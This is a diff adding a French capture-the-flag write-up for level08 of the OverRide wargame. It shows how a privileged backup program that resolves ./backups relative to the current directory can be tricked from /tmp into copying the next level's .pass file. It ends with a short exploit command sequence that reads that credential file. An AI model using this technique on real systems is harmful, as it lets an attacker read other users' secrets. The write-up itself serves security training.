@@ -1,0 +1,56 @@
+1) On remarque apres test de l'executable que le dossier backups
+depend du dossier courant
+
+level08@OverRide:~$ ./level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+
+2) On se place dans /tmp
+
+cd /tmp
+
+level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups/.log
+
+3) On voit que le programme veut un fichier .log dans ./backups
+
+mkdir backups
+touch ./backups/.log
+
+level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+
+4) On va creer les dossiers et fichier demander par l erreur
+
+mkdir backups/home
+mkdir backups/home/users
+mkdir backups/home/users/level09
+touch backups/home/users/level09/.pass
+
+level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+
+5) Cela donne tjrs une erreur, on va essayer de donner les droits de lecteur
+et ecriture pout tlm au fichier
+
+chmod -R 777 backups
+
+level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+
+6) On essaie de supprimer le fichier .pass creer precedament
+
+rm backups/home/users/level09/.pass
+
+level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
+level08@OverRide:/tmp$
+
+- Exploit :
+
+cd /tmp
+mkdir backups
+mkdir backups/home
+mkdir backups/home/users
+mkdir backups/home/users/level09
+chmod -R 777 backups/
+/home/users/level08/level08 /home/users/level09/.pass
+cat backups/home/users/level09/.pass
